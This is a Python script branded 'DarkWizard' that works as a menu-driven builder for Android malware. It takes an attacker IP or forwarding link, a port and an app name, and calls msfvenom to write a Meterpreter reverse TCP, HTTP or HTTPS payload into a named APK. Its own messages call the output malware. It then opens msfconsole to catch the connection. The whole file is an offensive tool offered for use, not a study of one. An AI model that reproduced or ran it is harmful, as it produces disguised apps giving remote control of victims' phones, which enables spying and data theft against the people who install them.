import os
os.system("clear")

a = "android/meterpreter_reverse_tcp" 
b = "android/meterpreter_reverse_http"
c = "android/meterpreter_reverse_https"

print('''\033[1;34;40m
____             _   __        ___                  _
|  _ \  __ _ _ __| | _\ \      / (_)______ _ _ __ __| |
| | | |/ _` | '__| |/ /\ \ /\ / /| |_  / _` | '__/ _` |
| |_| | (_| | |  |   <  \ V  V / | |/ / (_| | | | (_| |
|____/ \__,_|_|  |_|\_\  \_/\_/  |_/___\__,_|_|  \__,_|

\033[1;33;40mcontact me on telegrwm @DARKWIZARD62442\033[0m
\033[0m''')
print('''\033[1;32;40m
          |PAYLOAD|⁹                    |TYPE|                             |ABOUT|
------------------------------------------------------------------------------------------------------

[1] android/meterpreter/reverse_tcp     Great           Android Meterpreter Shell, Reverse TCP Stager
[2] android/meterpreter_reverse_http    normal          Android Meterpreter Shell, Reverse HTTP Stager
[3] android/meterpreter_reverse_https   bad             Android Meterpreter Shell, Reverse HTTPS Stager

------------------------------------------------------------------------------------------------------ 

\033[0m''')

selection = input('''[~] SELECT THE ATTACK TYPE :> ''')

if selection == "1":
            print("\033[1;34;40m[*]\033[0m \033[1;31;40mandroid/meterpreter/reverse_tcp\033[0m")
            ip = input("[~] ENTER YOUR IP :> ")
            print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mIP => {ip}\033[0m")
            port = input("[~] ENTER PORT :> ")
            print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mPORT => {port}\033[0m")
            path = input("[~] ENTER THE PATH :> ")
            name= input("[~] ENTER APP NAME :> ")
            print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mMALWARE SAVED AT {path}/{name}.apk\033[0m")
            os.system(f"msfvenom -p {a} LHOST={ip} LPORT={port} R> {path}/{name}.apk")
            os.system("msfconsole -q")


elif selection == "2":
             print("\033[1;34;40m[*]\033[0m \033[1;31;40mandroid/meterpreter/reverse_http\033[0m")
             ip2 = input("[~] ENTER FORWARDING LINK :> ")
             print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mLINK => {ip2}\033[0m")
             port2 = input("[~] ENTER PORT :> ")
             print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mPORT => {port2}\033[0m")
             path2 = input("[~] ENTER THE PATH :> ")
             name2= input("[~] ENTER APP NAME :> ")
             print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mMALWARE SAVED AT {path2}/{name2}.apk\033[0m")
             os.system(f"msfvenom -p {b} LHOST={ip2} LPORT={port2} R> {path2}/{name2}.apk")
             os.system("msfconsole -q")


elif selection == "3":
             print("\033[1;34;40m[*]\033[0m \033[1;31;40mandroid/meterpreter/reverse_https\033[0m")
             ip3 = input("[~] ENTER FORWARDING LINK :> ")
             print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mLINK => {ip3}\033[0m")
             port3 = input("[~] ENTER PORT :> ")
             print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mPORT => {port3}\033[0m")
             path3 = input("[~] ENTER THE PATH :> ")
             name3= input("[~] ENTER APP NAME :> ")
             print(f"\033[1;34;40m[*]\033[0m \033[1;31;40mMALWARE SAVED AT {path3}/{name3}.apk\033[0m")
             os.system(f"msfvenom -p {c} LHOST={ip3} LPORT={port3} R> {path3}/{name3}.apk")
             os.system("msfconsole -q")
